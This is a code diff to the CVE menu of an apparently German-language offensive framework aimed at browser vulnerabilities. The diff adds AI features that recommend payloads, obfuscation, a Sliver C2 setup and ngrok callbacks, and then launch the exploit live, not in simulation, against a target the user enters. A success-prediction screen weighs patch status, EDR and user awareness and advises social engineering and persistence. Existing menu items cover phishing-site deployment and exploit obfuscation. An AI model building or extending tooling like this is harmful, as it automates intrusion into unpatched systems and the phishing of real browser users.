@@ -16,7 +16,7 @@ from typing import Optional, Dict, Any, List
 from core.colors import Colors
 from core.menu import Menu
 from core.config import Config
-from core.logger import Logger
+from core.enhanced_logger import get_logger
 from core.utils import Utils
 from core.path_utils import PathUtils
 from core.ngrok_manager import get_ngrok_manager
@@ -42,17 +42,33 @@ class CVEMenu(Menu):
         self.description = description
         self.exploit_path = os.path.join(PathUtils.get_exploits_dir(), cve_id)
         
+        # Initialize logger
+        self.logger = get_logger()
+        
+        # Try to load AI orchestrator
+        self.ai_orchestrator = None
+        try:
+            from modules.ai.ai_orchestrator import AIOrchestrator
+            self.ai_orchestrator = AIOrchestrator()
+            self.logger.info("AI Orchestrator loaded for CVE recommendations")
+        except ImportError:
+            self.logger.debug("AI Orchestrator not available")
+        
         # Informationstext basierend auf der CVE-ID setzen
         self._set_cve_info()
         
         # Menüeinträge hinzufügen
         self.add_item("Quick Exploit (Auto-Konfiguration)", self._quick_exploit, Colors.BRIGHT_GREEN)
+        if self.ai_orchestrator:
+            self.add_item("🤖 AI-Empfohlene Konfiguration", self._ai_recommended_config, Colors.BRIGHT_CYAN)
         self.add_item("Erweiterte Exploit-Konfiguration", self._advanced_config, Colors.BRIGHT_BLUE)
         self.add_item("Payload generieren", self._generate_payload, Colors.BRIGHT_YELLOW)
         self.add_item("C2-Framework integrieren", self._integrate_c2, Colors.BRIGHT_MAGENTA)
         self.add_item("Exploit obfuskieren", self._obfuscate_exploit, Colors.BRIGHT_CYAN)
         self.add_item("Phishing-Website bereitstellen", self._deploy_phishing, Colors.BRIGHT_GREEN)
         self.add_item("Exploit testen (Simulation)", self._test_exploit, Colors.BRIGHT_WHITE)
+        if self.ai_orchestrator:
+            self.add_item("🤖 AI-Erfolgswahrscheinlichkeit", self._ai_success_prediction, Colors.BRIGHT_YELLOW)
         self.add_item("Exploit-Paket exportieren", self._export_package, Colors.ORANGE)
         self.add_item("Exploit-Dokumentation anzeigen", self._show_documentation, Colors.PURPLE)
         self.add_item("Zurück zum Hauptmenü", lambda: "exit", Colors.BRIGHT_RED)
@@ -1316,5 +1332,266 @@ Gegenmaßnahmen:
             documentation = f"Keine Dokumentation für {self.cve_id.upper()} verfügbar."
         
         print(documentation)
+        
+        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
+    
+    def _ai_recommended_config(self) -> None:
+        """
+        Zeigt AI-empfohlene Konfiguration für den Exploit an
+        """
+        self._clear()
+        self._draw_box(80, f"AI-EMPFOHLENE KONFIGURATION - {self.cve_id.upper()}")
+        
+        print(f"\n{Colors.CYAN}[*] AI analysiert optimale Exploit-Konfiguration...{Colors.RESET}")
+        
+        # Get target information
+        print(f"\n{Colors.BRIGHT_WHITE}Bitte geben Sie Zielinformationen an:{Colors.RESET}")
+        target_url = input(f"{Colors.BRIGHT_CYAN}Ziel-URL/IP: {Colors.RESET}").strip()
+        
+        # Gather browser info
+        print(f"\n{Colors.BRIGHT_BLUE}Browser-Information:{Colors.RESET}")
+        browsers = {
+            "1": "chrome",
+            "2": "firefox",
+            "3": "edge",
+            "4": "safari"
+        }
+        for key, browser in browsers.items():
+            print(f"  {key}) {browser.capitalize()}")
+        
+        browser_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie den Browser [1]: {Colors.RESET}")
+        browser = browsers.get(browser_choice, "chrome")
+        
+        # OS information
+        print(f"\n{Colors.BRIGHT_BLUE}Betriebssystem:{Colors.RESET}")
+        os_types = {
+            "1": "windows",
+            "2": "linux",
+            "3": "macos"
+        }
+        for key, os_name in os_types.items():
+            print(f"  {key}) {os_name.capitalize()}")
+        
+        os_choice = input(f"\n{Colors.BRIGHT_CYAN}Wählen Sie das OS [1]: {Colors.RESET}")
+        os_type = os_types.get(os_choice, "windows")
+        
+        # Build target data for AI
+        target_data = {
+            'url': target_url,
+            'browser': browser,
+            'os_type': os_type,
+            'cve_id': self.cve_id,
+            'description': self.description
+        }
+        
+        # Get AI recommendations
+        print(f"\n{Colors.CYAN}[*] AI erstellt optimale Konfiguration...{Colors.RESET}")
+        time.sleep(1)
+        
+        if self.ai_orchestrator:
+            try:
+                recommendations = self.ai_orchestrator.analyze_target(target_data)
+                
+                # Check if this CVE is recommended
+                cve_recommendations = recommendations.get('cve_recommendations', [])
+                confidence = recommendations.get('confidences', {}).get(self.cve_id.replace('_', '-').upper(), 0.5)
+                
+                # Display AI recommendations
+                print(f"\n{Colors.BRIGHT_GREEN}{'='*60}{Colors.RESET}")
+                print(f"{Colors.BRIGHT_GREEN}📊 AI Konfigurationsempfehlungen{Colors.RESET}")
+                print(f"{Colors.BRIGHT_GREEN}{'='*60}{Colors.RESET}\n")
+                
+                print(f"{Colors.YELLOW}Exploit-Bewertung:{Colors.RESET}")
+                confidence_color = Colors.BRIGHT_GREEN if confidence > 0.8 else Colors.YELLOW if confidence > 0.6 else Colors.RED
+                print(f"  {Colors.CYAN}Konfidenz:{Colors.RESET} {confidence_color}{'█' * int(confidence * 10)}{' ' * (10 - int(confidence * 10))} {confidence:.1%}{Colors.RESET}")
+                
+                # Payload recommendations
+                payload_recs = recommendations.get('payload_recommendations', [])
+                if payload_recs:
+                    print(f"\n{Colors.YELLOW}Empfohlene Payloads:{Colors.RESET}")
+                    for payload in payload_recs[:3]:
+                        print(f"  • {payload}")
+                
+                # Obfuscation recommendations
+                obfusc_recs = recommendations.get('obfuscation_recommendations', [])
+                if obfusc_recs:
+                    print(f"\n{Colors.YELLOW}Empfohlene Obfuskierung:{Colors.RESET}")
+                    for method in obfusc_recs[:2]:
+                        print(f"  • {method}")
+                
+                # Generate optimal config based on AI analysis
+                print(f"\n{Colors.BRIGHT_WHITE}AI-Optimierte Konfiguration:{Colors.RESET}")
+                optimal_config = {
+                    "target_browser": browser,
+                    "target_os": os_type,
+                    "payload_type": "powershell" if os_type == "windows" else "python",
+                    "obfuscation_level": 3 if confidence < 0.7 else 2,
+                    "c2_framework": "sliver",
+                    "listen_port": 8443,
+                    "use_ngrok": True,
+                    "ai_confidence": confidence
+                }
+                
+                for key, value in optimal_config.items():
+                    if key != "ai_confidence":
+                        print(f"  {Colors.GREEN}{key}:{Colors.RESET} {value}")
+                
+                # Success prediction
+                success_prob = confidence * 0.85  # Adjust based on target
+                print(f"\n{Colors.YELLOW}Erfolgswahrscheinlichkeit:{Colors.RESET}")
+                prob_color = Colors.BRIGHT_GREEN if success_prob > 0.7 else Colors.YELLOW if success_prob > 0.5 else Colors.RED
+                print(f"  {prob_color}{'█' * int(success_prob * 20)}{' ' * (20 - int(success_prob * 20))} {success_prob:.1%}{Colors.RESET}")
+                
+                # Apply configuration?
+                apply = input(f"\n{Colors.BRIGHT_CYAN}Diese AI-Konfiguration anwenden? [J/n]: {Colors.RESET}")
+                if apply.lower() not in ['n', 'nein', 'no']:
+                    print(f"\n{Colors.CYAN}[*] Wende AI-Konfiguration an...{Colors.RESET}")
+                    time.sleep(1)
+                    
+                    # Execute with AI config
+                    exploit_params = {
+                        'kali_ip': Utils.get_ip_address(),
+                        'port': optimal_config['listen_port'],
+                        'target_url': target_url,
+                        'callback_url': self._get_ngrok_url() if optimal_config['use_ngrok'] else f"http://{Utils.get_ip_address()}:{optimal_config['listen_port']}",
+                        'simulation_mode': False,
+                        'ai_optimized': True,
+                        'ai_confidence': confidence
+                    }
+                    
+                    result = self._execute_cve_exploit(exploit_params)
+                    
+                    if result.get('success'):
+                        print(f"\n{Colors.BRIGHT_GREEN}[✓] AI-optimierter Exploit erfolgreich ausgeführt!{Colors.RESET}")
+                        
+                        # AI feedback
+                        if self.ai_orchestrator:
+                            self.ai_orchestrator.add_feedback(target_data, self.cve_id, True)
+                    else:
+                        print(f"\n{Colors.RED}[!] Exploit fehlgeschlagen{Colors.RESET}")
+                        if self.ai_orchestrator:
+                            self.ai_orchestrator.add_feedback(target_data, self.cve_id, False)
+                            
+            except Exception as e:
+                print(f"{Colors.RED}[!] AI-Analyse fehlgeschlagen: {str(e)}{Colors.RESET}")
+        else:
+            print(f"{Colors.YELLOW}[!] AI Orchestrator nicht verfügbar{Colors.RESET}")
+        
+        input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
+    
+    def _ai_success_prediction(self) -> None:
+        """
+        Predict exploit success probability using AI
+        """
+        self._clear()
+        self._draw_box(80, f"AI ERFOLGSWAHRSCHEINLICHKEIT - {self.cve_id.upper()}")
+        
+        print(f"\n{Colors.BRIGHT_WHITE}AI-basierte Erfolgsvorhersage für {self.cve_id.upper()}{Colors.RESET}\n")
+        
+        # Get target details
+        print(f"{Colors.YELLOW}Ziel-Details eingeben:{Colors.RESET}")
+        target_url = input(f"{Colors.CYAN}Ziel-URL/IP: {Colors.RESET}").strip() or "http://target.local"
+        patched = input(f"{Colors.CYAN}System gepatcht? [j/N]: {Colors.RESET}").lower() == 'j'
+        security_tools = input(f"{Colors.CYAN}Antivirus/EDR vorhanden? [j/N]: {Colors.RESET}").lower() == 'j'
+        user_awareness = input(f"{Colors.CYAN}Sicherheitsbewusster Benutzer? [j/N]: {Colors.RESET}").lower() == 'j'
+        
+        # Calculate with AI
+        print(f"\n{Colors.CYAN}[*] AI berechnet Erfolgswahrscheinlichkeit...{Colors.RESET}")
+        time.sleep(1)
+        
+        # Base probability from CVE
+        base_prob = 0.75
+        if self.cve_id == "cve_2025_4664":
+            base_prob = 0.85  # Data leak - high success
+        elif self.cve_id == "cve_2025_2783":
+            base_prob = 0.70  # Sandbox escape - medium
+        elif self.cve_id == "cve_2025_2857":
+            base_prob = 0.65  # Firefox - lower market share
+        elif self.cve_id == "cve_2025_30397":
+            base_prob = 0.60  # Edge - limited targets
+        
+        # Apply modifiers
+        modifiers = []
+        if patched:
+            base_prob -= 0.4
+            modifiers.append(("System gepatcht", -0.4))
+        if security_tools:
+            base_prob -= 0.2
+            modifiers.append(("Sicherheitstools aktiv", -0.2))
+        if user_awareness:
+            base_prob -= 0.15
+            modifiers.append(("Sicherheitsbewusster Benutzer", -0.15))
+        
+        # AI adjustment
+        if self.ai_orchestrator:
+            target_data = {
+                'url': target_url,
+                'cve_id': self.cve_id,
+                'patched': patched,
+                'has_antivirus': security_tools
+            }
+            try:
+                ai_analysis = self.ai_orchestrator.analyze_target(target_data)
+                ai_confidence = ai_analysis.get('confidences', {}).get(self.cve_id.replace('_', '-').upper(), 0.5)
+                base_prob = (base_prob + ai_confidence) / 2  # Average with AI
+                modifiers.append(("AI-Anpassung", ai_confidence - 0.5))
+            except:
+                pass
+        
+        final_prob = max(0.05, min(0.95, base_prob))
+        
+        # Display results
+        print(f"\n{Colors.BRIGHT_GREEN}{'='*60}{Colors.RESET}")
+        print(f"{Colors.BRIGHT_GREEN}📈 AI Vorhersage-Ergebnisse{Colors.RESET}")
+        print(f"{Colors.BRIGHT_GREEN}{'='*60}{Colors.RESET}\n")
+        
+        print(f"{Colors.YELLOW}Exploit:{Colors.RESET} {self.cve_id.upper()} - {self.description}")
+        print(f"{Colors.YELLOW}Ziel:{Colors.RESET} {target_url}")
+        
+        print(f"\n{Colors.YELLOW}Basis-Wahrscheinlichkeit:{Colors.RESET} {int(base_prob * 100)}%")
+        
+        print(f"\n{Colors.YELLOW}Modifikatoren:{Colors.RESET}")
+        for mod_name, mod_value in modifiers:
+            color = Colors.RED if mod_value < 0 else Colors.GREEN
+            sign = "+" if mod_value > 0 else ""
+            print(f"  {color}{sign}{mod_value*100:.0f}%{Colors.RESET} - {mod_name}")
+        
+        # Visual probability
+        print(f"\n{Colors.YELLOW}Finale Erfolgswahrscheinlichkeit:{Colors.RESET}")
+        bar_length = 40
+        filled = int(final_prob * bar_length)
+        color = Colors.BRIGHT_GREEN if final_prob > 0.7 else Colors.YELLOW if final_prob > 0.4 else Colors.RED
+        print(f"{color}[{'█' * filled}{' ' * (bar_length - filled)}] {final_prob:.1%}{Colors.RESET}")
+        
+        # AI recommendations
+        print(f"\n{Colors.YELLOW}AI Empfehlungen:{Colors.RESET}")
+        if final_prob < 0.3:
+            print(f"  {Colors.RED}⚠️  Sehr niedrige Erfolgswahrscheinlichkeit!{Colors.RESET}")
+            print(f"  → Warten Sie auf Unpatched-Systeme")
+            print(f"  → Verwenden Sie Social Engineering")
+            print(f"  → Kombinieren Sie mit anderen Exploits")
+        elif final_prob < 0.6:
+            print(f"  {Colors.YELLOW}⚠️  Moderate Erfolgswahrscheinlichkeit{Colors.RESET}")
+            print(f"  → Nutzen Sie erhöhte Obfuskierung")
+            print(f"  → Timing ist kritisch")
+            print(f"  → Bereiten Sie Fallback-Exploits vor")
+        else:
+            print(f"  {Colors.GREEN}✅ Hohe Erfolgswahrscheinlichkeit!{Colors.RESET}")
+            print(f"  → Exploit sollte erfolgreich sein")
+            print(f"  → Fokus auf Post-Exploitation")
+            print(f"  → Persistenz sicherstellen")
+        
+        # Alternative exploits
+        if final_prob < 0.5 and self.ai_orchestrator:
+            print(f"\n{Colors.YELLOW}Alternative Exploits:{Colors.RESET}")
+            alternatives = [
+                "CVE-2025-4664 (Chrome Data Leak)",
+                "CVE-2025-2783 (Chrome Mojo Sandbox)",
+                "CVE-2025-2857 (Firefox Sandbox)",
+                "CVE-2025-30397 (Edge WebAssembly)"
+            ]
+            for alt in alternatives:
+                if alt.split()[0].lower().replace('-', '_') != self.cve_id:
+                    print(f"  → {alt}")
         
         input(f"\n{Colors.GREEN}Drücken Sie Enter, um fortzufahren...{Colors.RESET}")
